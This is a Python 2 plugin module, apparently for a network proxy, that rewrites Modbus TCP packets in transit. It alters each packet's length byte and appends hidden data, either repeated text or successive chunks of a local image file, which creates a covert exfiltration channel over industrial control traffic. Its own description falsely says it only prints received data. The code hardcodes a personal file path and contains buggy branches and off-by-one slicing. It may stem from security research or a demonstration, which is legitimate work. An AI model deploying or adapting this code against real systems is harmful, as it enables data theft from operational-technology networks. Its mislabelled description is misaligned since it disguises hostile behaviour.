#!/usr/bin/env python2
import os.path as path
import struct


class Module:
    def __init__(self, incoming=False, verbose=False, options=None):
        self.name = path.splitext(path.basename(__file__))[0]
        self.description = 'Simply print the received data as text'
        self.incoming = incoming  # incoming means module is on -im chain

        # Task settings
        # Text to leak
        self.text_to_leak = "otorio Rocks!"

        # How many times we want to leak the text
        self.text_to_leak_times = 50

        # Image file location
        self.image_file = "/home/matand/Pictures/pic.png"

        # Bytes count for image file
        self.bytes_count = 0

        # Task mode: 0 = Normal, 1 = Leaking text, 2 = Leaking image, 3 = Leaking image with limitations
        self.task_mode = 1

        # Maximum leak size allowed by the Modbus TCP protocol itself.
        # Actually it's 253 bytes, but the first 3 bytes are reserved for the factory operation.
        self.max_leaked_size = 250

    def execute(self, data):
        if self.task_mode == 1:
            leak_times = 0
            while self.bytes_count + len(self.text_to_leak) < 200:
                if self.text_to_leak_times < 1:
                    break

                leak_times += 1
                self.text_to_leak_times -= 1
                self.bytes_count += len(self.text_to_leak)

            data_to_leak = ""

            for x in range(leak_times + 1):
                data_to_leak += self.text_to_leak

            total_len = len(data_to_leak) + 1
            self.bytes_count = 0

            return data[:8] + chr(total_len) + data[9:] + data_to_leak

        elif self.task_mode == 2:
            with open(self.image_file, "rb") as f:
                img_file_data = f.read()

            img_size = len(img_file_data)
            BytesLeft = img_size - self.bytes_count

            if BytesLeft < self.max_leaked_size:
                BytesToRead = BytesLeft

            elif BytesLeft < 1:
                self.bytes_count = 0
                BytesLeft = img_size - self.bytes_count

                if BytesLeft < self.max_leaked_size:
                    BytesToRead = BytesLeft

                else:
                    BytesToRead = self.max_leaked_size

            else:
                BytesToRead = self.max_leaked_size

            packet_size = 1 + BytesToRead
            start_offset = self.bytes_count
            end_offset = start_offset + BytesToRead + 1
            self.bytes_count += BytesToRead

            return data[:8] + chr(packet_size) + data[9:] + img_file_data[start_offset:end_offset]

        elif self.task_mode == 3:
            with open(self.image_file, "rb") as f:
                img_file_data = f.read()

            img_size = len(img_file_data)
            BytesLeft = img_size - self.bytes_count

            if BytesLeft < 12:
                BytesToRead = BytesLeft

            elif BytesLeft == 0:
                return data

            else:
                BytesToRead = 12 # Max bytes, 12 bytes, it's hard coded.

            packet_size = 113 + BytesToRead
            start_offset = self.bytes_count
            end_offset = start_offset + BytesToRead + 1
            self.bytes_count += BytesToRead
            data_zero = ""
            for x in range(113):
                data_zero += b'\x00'

            return data[:8] + chr(packet_size) + data[9:] + data_zero + img_file_data[start_offset:end_offset]

        return data

    def help(self):
        return ""


if __name__ == '__main__':
    print 'This module is not supposed to be executed alone!'
